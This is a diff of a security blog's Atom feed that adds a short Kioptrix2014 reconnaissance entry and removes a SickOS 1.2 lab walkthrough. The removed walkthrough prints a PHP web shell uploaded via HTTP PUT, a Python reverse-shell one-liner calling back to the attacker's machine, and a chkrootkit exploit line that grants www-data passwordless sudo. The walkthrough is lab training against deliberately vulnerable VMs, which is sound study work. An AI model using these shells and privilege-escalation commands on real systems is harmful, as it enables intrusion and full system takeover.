@@ -4,7 +4,7 @@
   <title><![CDATA[Category: vulhub | Bob1Bob2]]></title>
   <link href="http://wg135.github.io/blog/categories/vulhub/atom.xml" rel="self"/>
   <link href="http://wg135.github.io/"/>
-  <updated>2016-07-07T10:53:15-05:00</updated>
+  <updated>2016-07-07T15:04:49-05:00</updated>
   <id>http://wg135.github.io/</id>
   <author>
     <name><![CDATA[Bob1Bob2]]></name>
@@ -12,6 +12,41 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[Kioptrix2014 (#5)]]></title>
+    <link href="http://wg135.github.io/blog/2016/07/07/kioptrix2014-number-5/"/>
+    <updated>2016-07-07T14:27:35-05:00</updated>
+    <id>http://wg135.github.io/blog/2016/07/07/kioptrix2014-number-5</id>
+    <content type="html"><![CDATA[<h3>Tools:</h3>
+
+<ul>
+<li>netdiscover</li>
+<li>Nmap</li>
+<li>nikto</li>
+</ul>
+
+
+<!--more-->
+
+
+<p>Use netdiscover to detect target IP address</p>
+
+<p><code>netdiscover -i eth0 -r 192.168.79.0/24</code></p>
+
+<p><img src="/images/blog/vulhub/kioptrix5/Selection_001.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>192.168.79.193 is the target.</p>
+
+<p>Then run nmap to detect opening ports and running services on the target machine.</p>
+
+<p><code>nmap -sV -v -O -A -T5 192.168.79.193 -p-</code></p>
+
+<p><img src="/images/blog/vulhub/kioptrix5/Selection_002.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>port 80 and 8080 are opening</p>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[Vulhub Kioptrix Level 4]]></title>
@@ -908,132 +943,6 @@ int main(int argc, char ** argv)
 <p>run attack:</p>
 
 <p><img src="/images/blog/vulhub/kioptrix1/Selection_010.png" title="[title manually exploit [alt text]]" ></p>
-
-<p>DONE</p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[sickos1.2]]></title>
-    <link href="http://wg135.github.io/blog/2016/05/31/vulhub-sickos1-dot-2/"/>
-    <updated>2016-05-31T13:08:16-05:00</updated>
-    <id>http://wg135.github.io/blog/2016/05/31/vulhub-sickos1-dot-2</id>
-    <content type="html"><![CDATA[<p>From <a href="From%20[Vulhub](https://www.vulnhub.com/entry/csharp-vulnjson,134/">Vulhub</a></p>
-
-<h3>Tools:</h3>
-
-<ul>
-<li>netdiscover</li>
-<li>Nmap</li>
-<li>Nikto</li>
-<li>Wfuzz</li>
-<li>Curl</li>
-</ul>
-
-
-<!--more-->
-
-
-<p>Use netdiscover to detect target IP address</p>
-
-<p><code>netdiscover -i eth0 -r 192.168.79.0/24</code></p>
-
-<p><img src="/images/blog/vulhub/sickos1.2/Selection_001.png" title="[title manually exploit [alt text]]" ></p>
-
-<p>192.168.79.180 is the target.</p>
-
-<p>Then run nmap to detect opening ports and running services on the target machine.</p>
-
-<p><code>nmap -sV -v -O -A -T5 192.168.79.180 -p-</code></p>
-
-<p>Looks like port 22 and port 80 are openning.</p>
-
-<p><img src="/images/blog/vulhub/sickos1.2/Selection_002.png" title="[title manually exploit [alt text]]" ></p>
-
-<p>Check the <a href="http://192.168.79.180">http://192.168.79.180</a></p>
-
-<p><img src="/images/blog/vulhub/sickos1.2/Selection_003.png" title="[title manually exploit [alt text]]" ></p>
-
-<p>Not excited.</p>
-
-<p>use Nikto:</p>
-
-<p><img src="/images/blog/vulhub/sickos1.2/Selection_004.png" title="[title manually exploit [alt text]]" ></p>
-
-<p>Still nothing cool</p>
-
-<p>try wfuzz:</p>
-
-<pre><code>wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --hc 404 http://192.168.79.180/FUZZ 2&gt;/dev/null
-</code></pre>
-
-<p>find a test dir:</p>
-
-<p><img src="/images/blog/vulhub/sickos1.2/Selection_005.png" title="[title manually exploit [alt text]]" ></p>
-
-<p><img src="/images/blog/vulhub/sickos1.2/Selection_006.png" title="[title manually exploit [alt text]]" ></p>
-
-<p>next exam the HTTP options:</p>
-
-<pre><code>curl -v -X OPTIONS http://192.168.79.180/test/
-</code></pre>
-
-<p><img src="/images/blog/vulhub/sickos1.2/Selection_007.png" title="[title manually exploit [alt text]]" ></p>
-
-<p>looks like it supports PUT.</p>
-
-<p>Now upload php reverse shell (I tried different ports, looks like only 443 port works):</p>
-
-<pre><code>nmap -p80 192.168.79.180 --script http-put --script-args http-put.url='/test/shell.php',http-put.file='shell.php'
-</code></pre>
-
-<p><img src="/images/blog/vulhub/sickos1.2/Selection_008.png" title="[title manually exploit [alt text]]" ></p>
-
-<p>now the shell is uploaded:</p>
-
-<p><img src="/images/blog/vulhub/sickos1.2/Selection_009.png" title="[title manually exploit [alt text]]" ></p>
-
-<p>get the reverse shell:</p>
-
-<p><img src="/images/blog/vulhub/sickos1.2/Selection_010.png" title="[title manually exploit [alt text]]" ></p>
-
-<p>A better php shell:</p>
-
-<pre><code class="php">&lt;?php system($_GET["exec"]); ?&gt;
-</code></pre>
-
-<p>Upload this shell, and in brower:</p>
-
-<pre><code>http://192.168.79.180/test/exec.php?exec=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.79.173",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
-</code></pre>
-
-<p>get the shell.</p>
-
-<p>During enumeration step, I follow <a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/">g0tmi1k</a></p>
-
-<p><code>ls -l /etc/cron.daily</code></p>
-
-<p><img src="/images/blog/vulhub/sickos1.2/Selection_012.png" title="[title manually exploit [alt text]]" ></p>
-
-<p>After enumeration, find the system has chkrootkit:</p>
-
-<p><code>dpkg -l | grep chkrootkit</code></p>
-
-<p>chkrootkit verions is 0.49 and it is vulnerable.</p>
-
-<p><code>searchsploit chkrootkit</code></p>
-
-<p><code>echo 'chmod 777 /etc/sudoers &amp;&amp; echo "www-data ALL=NOPASSWD: ALL" &gt;&gt; /etc/sudoers &amp;&amp; chmod 440 /etc/sudoers' &gt; /tmp/update</code></p>
-
-<p>also need to change the privilages on the update file with chmod 777 and wait:</p>
-
-<p><code>ls -al /etc/sudoers</code></p>
-
-<p>try:</p>
-
-<p><code>sudo su</code></p>
-
-<p><img src="/images/blog/vulhub/sickos1.2/Selection_013.png" title="[title manually exploit [alt text]]" ></p>
 
 <p>DONE</p>
 ]]></content>
